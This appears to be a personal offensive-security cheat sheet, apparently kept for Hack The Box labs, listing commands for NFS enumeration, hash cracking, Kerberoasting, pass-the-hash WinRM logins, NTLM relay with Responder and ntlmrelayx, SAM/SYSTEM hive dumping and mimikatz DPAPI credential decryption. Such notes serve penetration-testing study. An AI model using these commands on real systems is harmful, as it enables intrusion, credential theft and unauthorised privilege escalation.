# Privesc
* https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master
# Nfs (RPC)

`sudo apt-get install rpcbind nfs-kernel-server

```
rpcinfo -p remote.htb
rpcinfo -n <port> -t <url> <program>
rpcinfo -n 2049 -t remote.htb 100003
```

Check folders to mount:
```
showmount -e remote.htb
```

Mount:
```
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
```

As it was using Umbraco, you directly go and search for Umbraco credential files. After doing so and inspecting the `Umbraco.sdf`  file, you can observe that there is some sort of credentials of type adminadmin@domain.locala1s34o41d5nqwoidn128312h938. So using the hashlike and hashcat hashes reference webpage:
https://hashcat.net/wiki/doku.php?id=example_hashes

You can match yout hash and type `hashcat -h` find the mode (100) and go for some:
`hashcat -m 100 -a 0 admin_hash rockyou.txt` and you find that htb is so m\'focker that the hash is the example one and the pass is:
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese

Some discovery could be helpful, so i will try all seclists' PHP discovery files:
 `find /home/lotape6/resources/hack/SecLists/ -name *php* | grep Discovery | xargs -I · gobuster dir -u http://remote.htb/ -w · 

Effectively, searching Umbraco admin panel is much easier and quicker:
remote.htb/umbraco

Search for umbraco version and it is vulnerable, so let's exploit it:


# Kerberos
## Enumerate
#impacket #kerberos #GetUserSPNS 
After having some credential in the active directory try:
```
python GetUserSPNs.py -request -dc-ip 10.0.0.1 DOMAIN/user:password -outputfile hash.txt

# For later decryption: 
hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist
```

# WinRM
#evil-winrm #winrm #port-5895
Assuming you have some valid credentials:
```
# Connect to a host:
evil-winrm --ip {{ip}} --user {{user}} --password {{password}}

# Connect to a host, passing the password hash:
evil-winrm --ip {{ip}} --user {{user}} --hash {{nt_hash}}

# Download files from remote machine (once connected)
download file_path remote_path

```

# Users / Groups management
```
# Create user
net user <name> <pass> /add /domain

# Add user to group group name "Exchange... ...ions" user "mcflanagan"
net group "Exchange Windows Permissions" mcflanagan /add

# Add user to local group
net localgroup "Account Operators" mcflanagan /add


```


# NTLM Relay Attack
> [!NOTE] Check message-signing is disabled
> Run `nmap -p445 -sC -sV $(cat ip)` and check if message signing is disabled
* Info: https://securance.com/news/smb-signing/
* [Responder](https://github.com/lgandx/Responder)
* [NetExec](https://github.com/Pennyw0rth/NetExec)
* [Impacket-ntlmrelayx](https://github.com/fortra/impacket)
#ntlm-relay-attack #repetier #ntlmrelayx
```
#? Obtain a list of systems with SMB signing disabled
netexec smb <ip>/24 --gen-relay-list targets.txt

#Let's disable SMB and HTTP servers on Responder in order to be able to forward captured hash to ntlmrealyx
# Open responder conf and turn off the SMB and HTTP servers
# Check the iface you're communicating to host machine

./Responder.py -I tun0 -d -w -P
# 1
python3 ntlmrelayx.py -t <ip>
# 2 (Default port 1080 for socks)
python3 ntlmrelayx.py -socks -smb2support  -t <ip>

```
For "# 2"  check [this](https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/#identifying-vulnerable-smb-services) out.
# MSRPC
#port-135 #port-139

# SAM and SYSTEM
#sam 
## On windows
```
reg save hklm\sam C:\inetpub\ftproot\sam
reg save hklm\system C:\inetpub\ftproot\system
```
## Extract hashes from SAM and SYSTEM
#sam #samdump2 #sam2hash
```
samdump2 SYSTEM SAM
```

## Extracting SAM and SYSTEM from VHD files
#sam #vhd 
```
sudo apt install libguestfs-tools -y

sudo mkdir /mnt/bastion
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/bastion

sudo su

cd /mnt/bastion
cd Windows/System32/config
- cp SAM SYSTEM /tmp


```


# SharpHound
[[Active Directory Cheatsheet#SharpHound (enumeration)]]


# Checking user permissions
#permisssions-check
```
whoami /priv
whoami /all
```

# Interesting folders
#windows-interesting-folders
```
%APPDATA%
Windows/System32/config


# Master key for stored credentials
%appdata%\Microsoft\Protect\<SID>\<masterkey>

# Credentials
dir /a:h C:\Users\<username>\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\<username>\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
```


# Extracting Passwords (DPAPI)
#dpapi #windows-extraxt-passwords #mimikatz
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin
First check if you can find a masterkey over:
`%appdata%\Microsoft\Protect\<SID>\<masterkey>`

Also check if there is any credential stored:
`C:\Users\<username>\AppData\Local\Microsoft\Credentials\`
`C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\`

Then try to decode the masterkey with mimikatz:
```
dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<whatever>\<andever> /sid:<ssid> /password:<pass>
```
Should be cached:
```
dpapi::cache
```

Then you can try to decode the actual password from the stored credentials:
```
dpapi::cred /in:C:\path\to\the\credential
```
